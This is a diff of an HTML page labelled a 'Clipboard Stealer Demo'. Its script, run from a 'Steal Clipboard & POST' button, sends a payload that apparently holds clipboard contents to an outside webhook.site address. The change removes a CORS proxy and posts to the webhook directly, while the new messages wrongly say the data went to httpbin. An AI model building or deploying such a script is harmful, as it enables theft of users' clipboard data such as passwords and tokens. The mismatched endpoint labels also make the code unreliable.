@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Clipboard Stealer Demo (Fixed)</title>
+  <title>Clipboard Stealer Test (httpbin)</title>
 </head>
 <body>
-  <h1>🚨 Simulated Clipboard Stealer</h1>
+  <h1>📋 Clipboard Stealer Demo (Testing)</h1>
   <button onclick="stealClipboard()">Steal Clipboard & POST</button>
   <pre id="output"></pre>
 
@@ -23,9 +23,7 @@
           timestamp: new Date().toISOString()
         };
 
-        const realWebhook = "https://webhook.site/ed442c85-933a-4da3-987c-14d277c4d8e1"; // Replace if needed
-        const proxy = "https://cors.bridged.cc/";
-        const webhookURL = proxy + realWebhook;
+        const webhookURL = "https://webhook.site/ed442c85-933a-4da3-987c-14d277c4d8e1";
 
         const response = await fetch(webhookURL, {
           method: "POST",
@@ -35,11 +33,12 @@
           body: JSON.stringify(payload)
         });
 
-        const resultText = await response.text();
-        output.textContent += `\n\n✅ Sent to webhook.\nStatus: ${response.status}\nResponse: ${resultText}`;
+        const result = await response.json();
+        output.textContent += `\n\n✅ Sent to httpbin.\nResponse:\n` +
+          JSON.stringify(result.json, null, 2);
       } catch (err) {
         output.textContent += `\n\n❌ Error: ${err}`;
-        console.error("Fetch Error:", err);
+        console.error("Fetch error:", err);
       }
     }
   </script>
